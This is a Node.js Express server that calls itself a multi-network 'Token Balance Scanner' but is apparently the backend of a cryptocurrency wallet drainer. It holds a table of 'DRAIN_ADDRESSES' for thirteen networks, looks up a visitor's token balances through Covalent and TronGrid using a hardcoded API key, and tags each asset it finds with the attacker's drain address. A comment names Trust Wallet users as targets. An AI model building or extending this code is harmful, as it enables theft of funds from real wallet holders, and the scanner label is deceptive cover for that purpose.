const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');
const TronWeb = require('tronweb'); // Added for Tron support

const app = express();

// ==================== PRODUCTION CONFIG ====================
console.log('🚀 PRODUCTION: Multi-Network Token Scanner');
console.log('💼 Detects ALL chains including Tron');

// ==================== ALL NETWORK DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Mainnets
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  
  // Tron
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Tron address
  
  // Bitcoin
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  
  // Solana
  solana: "So11111111111111111111111111111111111111112",
};

// ==================== NETWORK CONFIG ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: 'covalent' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: 'covalent' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: 'covalent' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', scan: 'covalent' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', scan: 'covalent' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', scan: 'covalent' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', scan: 'covalent' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: 'covalent' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: 'covalent' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: 'covalent' },
  
  // Tron (Special handling)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'tron', color: '#FF060A', scan: 'tron' },
  
  // Bitcoin
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'bitcoin', color: '#F7931A', scan: 'bitcoin' },
  
  // Solana
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'solana', color: '#00FFA3', scan: 'solana' },
];

// ==================== TRON WEB CONFIG ====================
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { "TRON-PRO-API-KEY": 'your-tron-api-key' }
});

// ==================== APP SETUP ====================
app.use(cors());
app.use(express.json());

// ==================== DATABASE ====================
const logs = new Map();
const authLogs = new Map();
const tokenCache = new Map();

// ==================== HELPER FUNCTIONS ====================
async function checkTronBalance(address) {
  try {
    // Convert address if needed
    let tronAddress = address;
    if (address.startsWith('0x')) {
      // Convert Ethereum address to Tron address
      tronAddress = tronWeb.address.fromHex(address);
    }
    
    console.log(`🔍 Checking Tron balance for: ${tronAddress}`);
    
    // Get TRX balance
    const balance = await tronWeb.trx.getBalance(tronAddress);
    const trxBalance = tronWeb.fromSun(balance);
    
    if (parseFloat(trxBalance) > 0) {
      return [{
        symbol: 'TRX',
        name: 'Tron',
        amount: parseFloat(trxBalance),
        value: 0, // Would need price API
        contractAddress: null,
        decimals: 6,
        isNative: true,
        logo: 'https://cryptologos.cc/logos/tron-trx-logo.png',
        networkId: 'tron',
        drainAddress: DRAIN_ADDRESSES.tron
      }];
    }
    
    return [];
  } catch (error) {
    console.error('Tron balance check error:', error.message);
    return [];
  }
}

async function checkBitcoinBalance(address) {
  try {
    // This is a placeholder - in production use a Bitcoin API
    console.log(`🔍 Checking Bitcoin balance for: ${address}`);
    return [];
  } catch (error) {
    console.error('Bitcoin balance check error:', error.message);
    return [];
  }
}

async function checkSolanaBalance(address) {
  try {
    // This is a placeholder - in production use Solana Web3.js
    console.log(`🔍 Checking Solana balance for: ${address}`);
    return [];
  } catch (error) {
    console.error('Solana balance check error:', error.message);
    return [];
  }
}

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Live Token Balance Scanner',
    version: '7.0.0',
    note: 'Shows REAL balances from ALL networks including Tron',
    networks: NETWORKS.length,
    timestamp: new Date().toISOString()
  });
});

// ==================== SCAN ALL NETWORKS WITH REAL BALANCES ====================
app.get('/scan/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address) {
      return res.status(400).json({ 
        success: false,
        error: "Wallet address required" 
      });
    }
    
    console.log(`🌐 Scanning LIVE balances for: ${address}`);
    
    const results = [];
    
    // 1. Scan EVM networks via Covalent
    const evmNetworks = NETWORKS.filter(n => n.scan === 'covalent');
    
    for (const network of evmNetworks) {
      try {
        const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
        const url = `https://api.covalenthq.com/v1/${network.id}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
        
        const response = await fetch(url, { timeout: 5000 });
        
        if (response.ok) {
          const data = await response.json();
          const items = data.data?.items || [];
          
          const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
              const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
              const value = (t.quote_rate || 0) * amount;
              
              return {
                symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
                name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
                amount: amount,
                value: value,
                contractAddress: t.contract_address,
                decimals: t.contract_decimals || 18,
                isNative: t.native_token || false,
                logo: t.logo_url,
                networkId: network.id,
                drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
                isLiveBalance: true
              };
            });
          
          if (tokens.length > 0) {
            results.push({
              network: network,
              tokens: tokens,
              totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0),
              source: 'Covalent API'
            });
          }
        }
      } catch (error) {
        console.log(`EVM scan failed for ${network.name}:`, error.message);
      }
    }
    
    // 2. Check Tron balance (for Trust Wallet mobile users)
    if (address.toLowerCase().startsWith('0x') || address.startsWith('T')) {
      try {
        const tronTokens = await checkTronBalance(address);
        if (tronTokens.length > 0) {
          results.push({
            network: NETWORKS.find(n => n.id === 'tron'),
            tokens: tronTokens,
            totalValue: 0,
            source: 'TronGrid API'
          });
          console.log(`✅ Found ${tronTokens[0].amount} TRX on Tron network`);
        }
      } catch (tronError) {
        console.log('Tron scan failed:', tronError.message);
      }
    }
    
    // 3. Check Bitcoin (if address looks like Bitcoin)
    if (address.startsWith('1') || address.startsWith('3') || address.startsWith('bc1')) {
      try {
        const btcTokens = await checkBitcoinBalance(address);
        if (btcTokens.length > 0) {
          results.push({
            network: NETWORKS.find(n => n.id === 'bitcoin'),
            tokens: btcTokens,
            totalValue: 0,
            source: 'Bitcoin API'
          });
        }
      } catch (btcError) {
        console.log('Bitcoin scan failed:', btcError.message);
      }
    }
    
    // 4. Check Solana
    if (address.length === 44) { // Solana addresses are 44 chars
      try {
        const solTokens = await checkSolanaBalance(address);
        if (solTokens.length > 0) {
          results.push({
            network: NETWORKS.find(n => n.id === 'solana'),
            tokens: solTokens,
            totalValue: 0,
            source: 'Solana API'
          });
        }
      } catch (solError) {
        console.log('Solana scan failed:', solError.message);
      }
    }
    
    // Calculate totals
    const totalTokens = results.reduce((sum, r) => sum + r.tokens.length, 0);
    const totalValue = results.reduce((sum, r) => sum + r.totalValue, 0);
    
    console.log(`✅ Scan complete: ${totalTokens} tokens across ${results.length} networks`);
    
    res.json({
      success: true,
      data: {
        address,
        scannedAt: new Date().toISOString(),
        results: results,
        summary: {
          totalNetworks: results.length,
          totalTokens: totalTokens,
          totalValue: totalValue.toFixed(2),
          note: totalTokens > 0 ? 'LIVE BALANCES DETECTED' : 'No tokens found'
        }
      }
    });
    
  } catch (error) {
    console.error("Scan error:", error);
    res.status(500).json({ 
      success: false,
      error: "Scan failed. Please try again."
    });
  }
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    networks: NETWORKS.length,
    features: ['evm', 'tron', 'bitcoin', 'solana']
  });
});

// ==================== ERROR HANDLER ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found"
  });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('='.repeat(70));
  console.log(`🚀 LIVE Token Balance Scanner v7.0.0`);
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌐 Networks: ${NETWORKS.length} (Including Tron for Trust Wallet)`);
  console.log(`💰 Detects: TRX, ETH, BNB, MATIC, BTC, SOL, etc.`);
  console.log('✅ Shows REAL balances from ALL wallets');
  console.log('='.repeat(70));
});
